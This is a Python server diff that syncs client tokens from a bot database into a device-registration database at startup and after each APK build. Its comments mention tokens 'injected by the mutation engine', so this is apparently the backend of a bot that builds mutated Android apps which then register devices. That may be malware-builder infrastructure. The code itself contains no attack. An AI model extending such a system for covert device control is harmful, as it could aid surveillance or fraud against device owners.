@@ -156,6 +156,56 @@ def init_db():
     conn.close()
     log.info(f"Database initialized: {DB_PATH}")
 
+    # ── Sync all active client tokens from bot.db → devices.db ───────────────
+    sync_clients_from_bot_db()
+
+
+def sync_clients_from_bot_db():
+    """
+    Sync all active client tokens from bot.db into devices.db clients table.
+    Called on server startup and after every build completion.
+    Ensures every APK token injected by the mutation engine is known to the
+    registration server — no manual DB inserts required.
+    """
+    try:
+        bot_db_path = os.path.join(os.path.dirname(__file__), "bot.db")
+        if not os.path.exists(bot_db_path):
+            return  # bot.db not present yet — skip silently
+
+        bot_db = sqlite3.connect(bot_db_path, timeout=5)
+        bot_db.row_factory = sqlite3.Row
+        rows = bot_db.execute(
+            "SELECT token, profile_name, active FROM clients WHERE token IS NOT NULL AND token != ''"
+        ).fetchall()
+        bot_db.close()
+
+        if not rows:
+            return
+
+        dev_db = sqlite3.connect(DB_PATH, timeout=5)
+        synced = 0
+        for row in rows:
+            dev_db.execute(
+                """INSERT OR IGNORE INTO clients
+                   (token, name, created_at, active)
+                   VALUES (?, ?, ?, ?)""",
+                (row["token"], row["profile_name"] or row["token"],
+                 int(time.time()), 1 if row["active"] else 0)
+            )
+            # Keep active flag in sync for existing rows
+            dev_db.execute(
+                "UPDATE clients SET active=? WHERE token=? AND active!=?",
+                (1 if row["active"] else 0, row["token"], 1 if row["active"] else 0)
+            )
+            synced += 1
+        dev_db.commit()
+        dev_db.close()
+        log.info(f"sync_clients_from_bot_db: synced {synced} client token(s)")
+
+    except Exception as e:
+        log.warning(f"sync_clients_from_bot_db error: {e}")
+
+
 def get_db():
     conn = sqlite3.connect(DB_PATH)
     conn.row_factory = sqlite3.Row
@@ -679,6 +729,8 @@ def build_complete():
         bot_db.commit()
         bot_db.close()
         log.info(f"build_complete: chat_id={chat_id} build={build_number} pkg={package_name} size={apk_size} dur={duration_secs}s")
+        # Sync new client token into devices.db so APK registration succeeds
+        sync_clients_from_bot_db()
         return jsonify({"ok": True}), 200
 
     except Exception as e:
